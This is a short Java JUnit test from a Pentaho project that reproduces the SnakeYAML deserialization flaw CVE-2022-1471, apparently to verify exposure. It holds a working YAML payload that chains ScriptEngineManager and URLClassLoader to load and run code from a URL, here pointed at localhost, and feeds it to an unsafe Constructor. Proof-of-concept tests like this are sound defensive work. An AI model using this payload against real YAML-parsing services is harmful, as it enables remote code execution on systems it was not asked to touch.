package org.pentaho.di.snakeyaml;

import org.junit.Test;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Map;

/**
 * based off: https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0
 */
public class PocSnakeYamlCveTest {

  final String attackVecctor = "!!javax.script.ScriptEngineManager [  \n"
    + "     !!java.net.URLClassLoader [[  \n"
    + "          !!java.net.URL [\"http://localhost:8080/\"]  \n"
    + "     ]]  \n"
    + "] ";

  public static class Test1 {
    public String some_var = "abe";
  }

  @Test
  public void exploit_cve_2022_1471_Test() throws Exception {
    InputStream is = new ByteArrayInputStream( attackVecctor.getBytes() );
    Yaml yaml = new Yaml( new Constructor( Test1.class ) );
    Map<String, Object> obj = yaml.load( is );
  }
}
